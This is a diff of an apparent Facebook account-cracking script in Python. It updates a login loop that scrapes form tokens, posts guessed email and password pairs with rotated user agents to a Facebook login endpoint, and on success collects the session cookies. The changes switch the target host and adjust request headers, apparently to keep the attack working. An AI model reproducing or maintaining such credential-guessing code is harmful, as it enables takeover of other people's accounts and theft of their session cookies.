@@ -250,7 +250,7 @@ def b(uid,pwx,tl):
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
-            free_fb = session.get('https://mbasic.facebook.com').text
+            free_fb = session.get('https://p.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -261,7 +261,7 @@ def b(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'mbasic.facebook.com',
+            header_freefb = {'authority': 'p.facebook.com',
             'method': 'GET',
             'path': '/',
             'scheme': 'https',
@@ -269,7 +269,6 @@ def b(uid,pwx,tl):
             'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
             'dpr': '2',
-            'referer': 'https://mbasic.facebook.com/?stype=lo&deoia=1&jlou=AfeUK5tm9FLZkimGP5KbUNsD9EDBr8vb0GX8J_RvgeCueLYzI8TOm_bOQV4iTtLzMLw2IZ2r7VYtqmwWIKTVHhu6VIXfnEFe9DrKtagSaSmbaA&smuh=65032&lh=Ac8Vp9WXX26YbFbc6fk&refid=31&ref_component=mbasic_footer&_rdr',
             'sec-ch-prefers-color-scheme': 'light',
             'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
             'sec-ch-ua-full-version-list': '"Chromium";v="111.0.5563.104", "Not(A:Brand";v="8.0.0.0"',
@@ -279,11 +278,12 @@ def b(uid,pwx,tl):
             'sec-ch-ua-platform-version': '"12.0.0"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
+            'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'pro',}
-            lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+            'user-agent': 'pro',
+            'viewport-width': '980',}
+            lo = session.post('https://p.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
